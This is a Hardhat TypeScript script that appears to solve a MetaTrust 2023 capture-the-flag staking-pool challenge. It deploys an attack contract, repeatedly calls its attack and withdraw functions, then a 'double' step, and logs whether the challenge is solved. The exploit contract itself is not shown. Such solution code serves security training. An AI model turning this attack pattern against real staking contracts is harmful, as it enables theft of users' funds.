import chalk from "chalk";
import { ethers } from "hardhat";
import { StakingPoolsDeploymentMetaTrust23__factory, StakingPoolsDeploymentMetaTrust23, StakingPoolAttackMetaTrust23__factory } from "../../typechain";
import { log, initialize } from "../utils";

async function main() {
    let [stakingPoolsDeploymentContract, attacker] = await initialize<StakingPoolsDeploymentMetaTrust23>(StakingPoolsDeploymentMetaTrust23__factory);
    let attackContract = await new StakingPoolAttackMetaTrust23__factory(attacker).deploy();
    await attackContract.waitForDeployment();
    let tx = await attackContract.setUp(await stakingPoolsDeploymentContract.getAddress());
    await tx.wait();

    for (let i=0; i<10; i++) {
      tx = await attackContract.attack();
      await tx.wait();
      tx = await attackContract.withdraw();
      await tx.wait();
    }
    log(`StageA: ${chalk.yellow(await stakingPoolsDeploymentContract.stageA())}`);
    
    tx = await attackContract.double();
    await tx.wait();
    log(`StageB: ${chalk.yellow(await stakingPoolsDeploymentContract.stageB())}`);

    log(`Is solved: ${chalk.yellow(await stakingPoolsDeploymentContract.isSolved())}`);

}

main().catch((error) => {
  console.error(error);
  process.exitCode = 1;
});